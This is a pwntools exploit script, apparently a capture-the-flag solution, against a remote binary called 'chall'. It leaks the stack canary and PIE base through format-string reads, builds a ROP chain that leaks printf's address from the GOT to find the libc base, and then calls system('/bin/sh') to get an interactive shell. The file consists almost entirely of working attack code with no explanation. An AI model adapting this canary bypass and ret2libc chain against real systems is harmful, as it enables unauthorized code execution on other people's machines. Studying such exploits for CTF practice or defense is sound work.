from pwn import *

elf = ELF('./chall')
p = remote("103.167.132.234", 29428)
# p = process("./chall")
# context.log_level = 'debug'
libc = ELF('./libc6_2.36-2_amd64.so')

p.sendlineafter(b">> ", b"1")
p.sendlineafter(b": ", b'%17$p')
p.recvuntil(b'--> ')
canary = int(p.recvuntil(b'00'), 16)
log.info(f'Canary: {hex(canary)}')

p.sendlineafter(b">> ", b"1")
p.sendlineafter(b": ", b'%10$p')
p.recvuntil(b'--> ')
rip = int(p.recvuntil(b'4c0'), 16)
elf.address = rip - 0x24c0
log.info(f'PIE Address: {hex(elf.address)}')

ret = elf.address + 0x0000000000001016
pop_rsi = elf.address + 0x0000000000001223
mov_rdi_rsi = elf.address + 0x0000000000001218
puts_got =  elf.address + 0x3f98
printf_got = elf.address + 0x3fa8
puts_plt = elf.address + 0x1030
main = elf.address + 0x10c0

payload = b'a'*104
payload += p64(canary)
payload += b'b'*8
payload += p64(pop_rsi)
payload += p64(printf_got)
payload += p64(mov_rdi_rsi)
payload += p64(puts_plt)
payload += p64(main)

p.sendlineafter(b">> ", b"2")
p.sendlineafter(b": ", payload)
p.recvuntil(b'Phrase: You failed..\n\n')
leak_puts = p.recvline().strip()
log.info(f"Len leak: {len(leak_puts)}")
leak_puts = u64(leak_puts.ljust(8, b"\x00"))
log.info(f"PUTS leak: {hex(leak_puts)}")

libc.address = leak_puts - libc.sym['printf']
str_bin_sh = next(libc.search(b'/bin/sh'))
system = libc.sym['system']

newpayload = b'a'*104
newpayload += p64(canary)
newpayload += p64(ret)
newpayload += p64(pop_rsi)
newpayload += p64(str_bin_sh) 
newpayload += p64(mov_rdi_rsi)
newpayload += p64(system)

p.sendlineafter(b">> ", b"2")
p.sendlineafter(b": ", newpayload)
p.interactive()
